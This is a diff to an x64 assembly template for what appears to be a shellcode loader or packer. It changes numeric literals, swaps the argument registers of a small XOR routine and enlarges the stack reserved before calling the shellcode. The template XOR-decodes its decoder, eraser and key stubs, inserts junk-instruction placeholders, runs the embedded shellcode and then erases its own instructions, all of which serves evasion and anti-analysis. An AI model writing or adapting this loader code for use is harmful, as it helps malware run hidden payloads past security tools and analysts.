@@ -43,27 +43,27 @@ header:
  loop_xor:
   // xor block data
   mov rdi, [rsi]
-  ror rdi, 0x11
+  ror rdi, 17
   xor rdi, rax
-  rol rdi, 0x07
+  rol rdi, 7
   xor rdi, rbx
   mov [rsi], rdi
 
   // seed ^= seed << 13
   mov rdx, rax
-  shl rdx, 0x0D
+  shl rdx, 13
   xor rax, rdx
   // seed ^= seed >> 7
   mov rdx, rax
-  shr rdx, 0x07
+  shr rdx, 7
   xor rax, rdx
   // seed ^= seed << 17
   mov rdx, rax
-  shl rdx, 0x11
+  shl rdx, 17
   xor rax, rdx
 
   // update address and counter
-  add rsi, 0x08
+  add rsi, 8
   dec rcx
   jnz loop_xor
 
@@ -128,9 +128,9 @@ entry:
   {{db .RestoreRegister}}
 
   // execute the shellcode
-  sub rsp, 0x60                    {{igi}}   // reserve stack
+  sub rsp, 0x80                    {{igi}}   // reserve stack
   call shellcode_stub              {{igi}}   // call the shellcode
-  add rsp, 0x60                    {{igi}}   // restore stack
+  add rsp, 0x80                    {{igi}}   // restore stack
  
   // erase the remaining instructions
   push rax                         {{igi}}   // save the shellcode return value
@@ -154,30 +154,30 @@ calc_entry_addr:
   push rax                         {{igi}}   // push return address
   ret                              {{igi}}   // return to the entry
 
-// rcx = data length, rdx = data address, r8 = key.
+// rcx = data address, rdx = data length, r8 = key.
 // this function assumes that the data length is divisible by 8.
 mini_xor:
-  shr rcx, 3                       {{igi}}   // rcx = rcx / 8
+  shr rdx, 3                       {{igi}}   // rcx = rcx / 8
   loop_xor:                        {{igi}}
-  xor [rdx], r8                    {{igi}}
-  add rdx, 8                       {{igi}}
-  dec rcx                          {{igi}}
+  xor [rcx], r8                    {{igi}}
+  add rcx, 8                       {{igi}}
+  dec rdx                          {{igi}}
   jnz loop_xor                     {{igi}}
   ret                              {{igi}}
 
 decode_stubs:
-  mov rcx, eraser_stub - decoder_stub        {{igi}}
-  lea rdx, [rbx + decoder_stub]              {{igi}}
+  lea rcx, [rbx + decoder_stub]              {{igi}}
+  mov rdx, eraser_stub - decoder_stub        {{igi}}
   mov r8, {{hex .DecoderStubKey}}            {{igi}}
   call mini_xor                              {{igi}}
 
-  mov rcx, crypto_key_stub - eraser_stub     {{igi}}
-  lea rdx, [rbx + eraser_stub]               {{igi}}
+  lea rcx, [rbx + eraser_stub]               {{igi}}
+  mov rdx, crypto_key_stub - eraser_stub     {{igi}}
   mov r8, {{hex .EraserStubKey}}             {{igi}}
   call mini_xor                              {{igi}}
 
-  mov rcx, shellcode_stub - crypto_key_stub  {{igi}}
-  lea rdx, [rbx + crypto_key_stub]           {{igi}}
+  lea rcx, [rbx + crypto_key_stub]           {{igi}}
+  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
   mov r8, {{hex .CryptoKeyStubKey}}          {{igi}}
   call mini_xor                              {{igi}}
   ret
